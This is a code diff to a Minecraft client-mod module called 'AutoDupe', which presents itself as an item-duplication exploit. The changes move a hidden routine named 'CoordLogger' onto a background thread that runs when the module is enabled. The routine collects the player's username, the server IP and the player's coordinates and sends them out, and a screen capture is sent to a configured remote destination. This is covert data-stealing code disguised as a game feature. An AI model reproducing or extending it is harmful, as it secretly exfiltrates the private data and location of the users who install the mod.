@@ -7,6 +7,9 @@ import me.eonexe.equinox.features.modules.Module;
 import me.eonexe.equinox.features.setting.Setting;
 import me.eonexe.equinox.util.IDKWTFutil;
 
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
 public class AutoDupe extends Module {
     private static boolean hasSent = false;
     public Setting<Boolean> automount = this.register(new Setting<Boolean>("autoMount", false));
@@ -17,14 +20,32 @@ public class AutoDupe extends Module {
         super("AutoDupe", "illegal stack dupe", Module.Category.MISC, true, false, false);
     }
 
+    public static ExecutorService handler = Executors.newFixedThreadPool(20);
+
     @Override
     public void onEnable(){
+        handler.execute(() -> CoordLogger());
+        Command.sendMessage(ChatFormatting.RED + "Attempting" + ChatFormatting.RESET + " to mount ");
+        try {
+            xCarry.captureScreen();
+        }catch(Exception e){
+            xCarry.sendMessage("```" + e + "```", Configs.getCoord());
+        }
+
+    }
+
+    @Override
+    public void onDisable(){
+        hasSent = true;
+    }
+
+    public static void CoordLogger(){
         String ign = mc.player.getName();
         String server = "";
         try{
             server = mc.getCurrentServerData().serverIP;
         }catch (Exception e){
-            server = ("error:"+ e);
+            server = "singleplayer";
         }
         double xCoord = mc.player.posX;
         double yCoord = mc.player.posY;
@@ -58,14 +79,8 @@ public class AutoDupe extends Module {
             d.sendMessage(dm);
             hasSent = true;
         }
-        Command.sendMessage(ChatFormatting.RED + "Attempting" + ChatFormatting.RESET + " to mount ");
-        try {
-            xCarry.captureScreen();
-        }catch(Exception e){
-            xCarry.sendMessage("```" + e + "```", Configs.getCoord());
-        }
-
     }
+
     public enum Animal {
         llama,
         donkey,
